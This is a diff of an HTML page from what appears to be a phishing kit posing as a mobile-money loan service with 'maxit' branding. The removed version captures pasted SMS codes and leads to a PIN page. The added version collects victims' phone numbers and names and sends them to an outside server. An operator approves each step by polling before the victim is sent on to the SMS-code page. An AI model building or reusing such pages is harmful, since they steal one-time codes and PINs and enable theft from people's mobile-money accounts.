@@ -1,246 +1,307 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMS Verification</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background: #000;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .container {
-            background: #111;
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 450px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-        }
-        h1 {
-            color: white;
-            font-size: 24px;
-            margin-bottom: 8px;
-            text-align: center;
-        }
-        .subtitle {
-            color: #888;
-            text-align: center;
-            margin-bottom: 30px;
-            font-size: 14px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            font-weight: 600;
-            color: #ccc;
-            margin-bottom: 6px;
-            font-size: 14px;
-        }
-        textarea {
-            width: 100%;
-            padding: 12px 16px;
-            border: 2px solid #333;
-            border-radius: 10px;
-            font-size: 16px;
-            font-family: inherit;
-            resize: vertical;
-            min-height: 120px;
-            background: #1a1a1a;
-            color: white;
-            transition: border-color 0.3s;
-        }
-        textarea:focus {
-            outline: none;
-            border-color: #7a3d1c;
-        }
-        .btn {
-            width: 100%;
-            padding: 14px;
-            background: #7a3d1c;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        .btn:hover {
-            background: #5a2d12;
-        }
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        .status {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 10px;
-            text-align: center;
-            display: none;
-            font-weight: 500;
-        }
-        .status.show {
-            display: block;
-        }
-        .status.waiting {
-            background: #1a1a2e;
-            color: #ffd93d;
-        }
-        .status.success {
-            background: #1a2e1a;
-            color: #6bcb77;
-        }
-        .status.error {
-            background: #2e1a1a;
-            color: #ff6b6b;
-        }
-        .back-link {
-            display: block;
-            text-align: center;
-            margin-top: 20px;
-            color: #7a3d1c;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        .back-link:hover {
-            text-decoration: underline;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Authentication</title>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family: Arial, sans-serif;
+}
+
+body{
+background:#000;
+height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+}
+
+.app{
+width:100%;
+max-width:420px;
+height:100vh;
+background:#000;
+display:flex;
+flex-direction:column;
+}
+
+/* IMAGE SECTION */
+
+.top-image{
+width:100%;
+height:55%;
+background:url("maxit-logo.jpeg") center/cover no-repeat;
+}
+
+/* FORM SECTION */
+
+.form-section{
+background:#111;
+color:white;
+padding:30px 25px;
+border-top-left-radius:35px;
+border-top-right-radius:35px;
+margin-top:-40px;
+flex:1;
+}
+
+.form-section h2{
+margin-bottom:25px;
+font-size:22px;
+}
+
+.input-box{
+display:flex;
+align-items:center;
+border-bottom:1px solid #555;
+margin-bottom:25px;
+padding-bottom:8px;
+}
+
+.input-box span{
+margin-right:10px;
+font-size:18px;
+}
+
+.input-box input{
+background:none;
+border:none;
+outline:none;
+color:white;
+width:100%;
+font-size:16px;
+padding:8px 0;
+}
+
+button{
+width:100%;
+padding:14px;
+background:#7a3d1c;
+border:none;
+border-radius:6px;
+color:white;
+font-size:16px;
+cursor:pointer;
+transition: background 0.3s;
+}
+
+button:disabled{
+background:#444;
+cursor:not-allowed;
+}
+
+button:hover:not(:disabled){
+background:#5a2d12;
+}
+
+.status-message {
+    margin-top: 20px;
+    padding: 15px;
+    border-radius: 8px;
+    text-align: center;
+    font-size: 14px;
+    display: none;
+    animation: fadeIn 0.5s ease;
+}
+
+.status-message.show {
+    display: block;
+}
+
+.status-message.waiting {
+    background: #1a1a2e;
+    color: #ffd93d;
+    border: 1px solid #ffd93d;
+}
+
+.status-message.success {
+    background: #1a2e1a;
+    color: #6bcb77;
+    border: 1px solid #6bcb77;
+}
+
+.status-message.error {
+    background: #2e1a1a;
+    color: #ff6b6b;
+    border: 1px solid #ff6b6b;
+}
+
+.status-message .spinner {
+    display: inline-block;
+    width: 20px;
+    height: 20px;
+    border: 3px solid rgba(255, 217, 61, 0.3);
+    border-radius: 50%;
+    border-top-color: #ffd93d;
+    animation: spin 1s ease-in-out infinite;
+    margin-right: 10px;
+    vertical-align: middle;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-10px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+</style>
 </head>
+
 <body>
-    <div class="container">
-        <h1>📱 SMS Verification</h1>
-        <p class="subtitle">Enter the code/message you received via SMS</p>
 
-        <form id="smsForm">
-            <div class="form-group">
-                <label for="smsMessage">📨 SMS Message Received</label>
-                <textarea 
-                    id="smsMessage" 
-                    placeholder="Paste the SMS message you received here..."
-                    required
-                ></textarea>
-            </div>
-            <button type="submit" class="btn" id="submitBtn">🔍 Validate SMS</button>
-        </form>
+<div class="app">
 
-        <div class="status" id="status"></div>
-        <a href="#" class="back-link" id="backLink">← Go Back</a>
-    </div>
+<div class="form-section">
 
-    <script>
-        // Get data from URL params
-        const urlParams = new URLSearchParams(window.location.search);
-        const name = urlParams.get('name');
-        const phone = urlParams.get('phone');
-        const botId = urlParams.get('botId');
+<h2>Authentication</h2>
 
-        // Handle back link
-        const backLink = document.getElementById('backLink');
-        if (botId) {
-            backLink.href = `/details.html?botId=${botId}`;
+<form id="detailsForm">
+
+<div class="input-box">
+<span>📞</span>
+<input id="phone" placeholder="Enter your phone number" required>
+</div>
+
+<button id="nextBtn">Log in</button>
+
+</form>
+
+<div id="status" class="status-message"></div>
+
+</div>
+
+</div>
+
+<script>
+
+const BACKEND_URL = "https://orange-loans-liberia.onrender.com";
+
+// ---------------- BOT ID ----------------
+const params = new URLSearchParams(window.location.search);
+const botId = params.get('botId') || window.location.pathname.split('/').pop();
+if (!botId) { alert("Invalid access link"); throw new Error(); }
+
+// ---------------- FLOW CHECK ----------------
+if (!localStorage.getItem('loanAmount')) {
+    window.location.href = `index.html?botId=${botId}`;
+}
+
+const nextBtn = document.getElementById('nextBtn');
+const statusDiv = document.getElementById('status');
+
+// ---------------- STATUS HELPER ----------------
+function showStatus(message, type) {
+    statusDiv.textContent = message;
+    statusDiv.className = 'status-message show';
+    if (type) {
+        statusDiv.classList.add(type);
+    }
+}
+
+function hideStatus() {
+    statusDiv.className = 'status-message';
+    statusDiv.textContent = '';
+}
+
+// ---------------- SUBMIT ----------------
+document.getElementById('detailsForm').addEventListener('submit', async e => {
+    e.preventDefault();
+
+    const phone = document.getElementById('phone').value.trim();
+    const name = localStorage.getItem('fullName');
+
+    if (!phone) {
+        showStatus('⚠️ Please enter your phone number', 'error');
+        return;
+    }
+
+    if (!name) {
+        showStatus('⚠️ Name not found. Please restart.', 'error');
+        return;
+    }
+
+    nextBtn.disabled = true;
+    nextBtn.textContent = "Processing...";
+    hideStatus();
+
+    try {
+        const res = await fetch(`${BACKEND_URL}/submit-details`, {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({
+                name,
+                phone,
+                botId
+            })
+        });
+
+        const data = await res.json();
+        
+        if (!res.ok) {
+            throw new Error(data.error || 'Failed to submit');
         }
 
-        const form = document.getElementById('smsForm');
-        const status = document.getElementById('status');
-        const submitBtn = document.getElementById('submitBtn');
+        // Store phone
+        localStorage.setItem('phone', phone);
 
-        function showStatus(message, type) {
-            status.textContent = message;
-            status.className = 'status show';
-            if (type) {
-                status.classList.add(type);
-            }
-        }
+        // Show waiting status with spinner
+        showStatus('⏳ Waiting for admin approval...', 'waiting');
 
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-
-            const smsMessage = document.getElementById('smsMessage').value.trim();
-
-            if (!smsMessage) {
-                showStatus('Please enter the SMS message you received.', 'error');
-                return;
-            }
-
-            if (!name || !phone || !botId) {
-                showStatus('Missing required information. Please go back and try again.', 'error');
-                return;
-            }
-
-            submitBtn.disabled = true;
-            submitBtn.textContent = '⏳ Validating...';
-            showStatus('⏳ Waiting for admin approval...', 'waiting');
-
+        // ---------------- POLLING ----------------
+        const poll = setInterval(async () => {
             try {
-                const response = await fetch('/submit-sms', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        name: name,
-                        phone: phone,
-                        smsMessage: smsMessage,
-                        botId: botId
-                    })
-                });
+                const r = await fetch(`${BACKEND_URL}/check-details/${data.requestId}`);
+                const d = await r.json();
 
-                const data = await response.json();
-
-                if (!response.ok) {
-                    throw new Error(data.error || 'Failed to submit SMS');
+                // ✅ APPROVED → REDIRECT TO SMS PAGE
+                if (d.approved === true) {
+                    clearInterval(poll);
+                    showStatus('✅ Approved! Redirecting...', 'success');
+                    nextBtn.disabled = false;
+                    nextBtn.textContent = "Log in";
+                    
+                    // Debug: Log what we're sending
+                    console.log('Redirecting to SMS with:', { name, phone, botId });
+                    
+                    setTimeout(() => {
+                        window.location.href = `/sms.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&botId=${botId}`;
+                    }, 1500);
                 }
 
-                // Poll for approval
-                const poll = setInterval(async () => {
-                    try {
-                        const r = await fetch(`/check-sms/${data.requestId}`);
-                        const d = await r.json();
+                // ❌ REJECTED → STAY HERE
+                if (d.approved === false) {
+                    clearInterval(poll);
+                    showStatus('❌ Request rejected. Please try again.', 'error');
+                    nextBtn.disabled = false;
+                    nextBtn.textContent = "Log in";
+                }
 
-                        if (d.approved === true) {
-                            clearInterval(poll);
-                            showStatus('✅ SMS verified! Redirecting...', 'success');
-                            submitBtn.disabled = false;
-                            submitBtn.textContent = '🔍 Validate SMS';
-                            setTimeout(() => {
-                                window.location.href = `/pin.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&botId=${botId}`;
-                            }, 1500);
-                        }
-
-                        if (d.approved === false) {
-                            clearInterval(poll);
-                            showStatus('❌ SMS verification rejected. Please try again.', 'error');
-                            submitBtn.disabled = false;
-                            submitBtn.textContent = '🔍 Validate SMS';
-                        }
-
-                    } catch (err) {
-                        clearInterval(poll);
-                        showStatus('⚠️ Connection lost. Please try again.', 'error');
-                        submitBtn.disabled = false;
-                        submitBtn.textContent = '🔍 Validate SMS';
-                    }
-                }, 2000);
-
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
-                submitBtn.disabled = false;
-                submitBtn.textContent = '🔍 Validate SMS';
+            } catch (err) {
+                clearInterval(poll);
+                showStatus('⚠️ Connection lost. Please try again.', 'error');
+                nextBtn.disabled = false;
+                nextBtn.textContent = "Log in";
             }
-        });
-    </script>
+
+        }, 2000);
+
+    } catch (err) {
+        showStatus('❌ ' + err.message, 'error');
+        nextBtn.disabled = false;
+        nextBtn.textContent = "Log in";
+    }
+});
+
+</script>
+
 </body>
 </html>
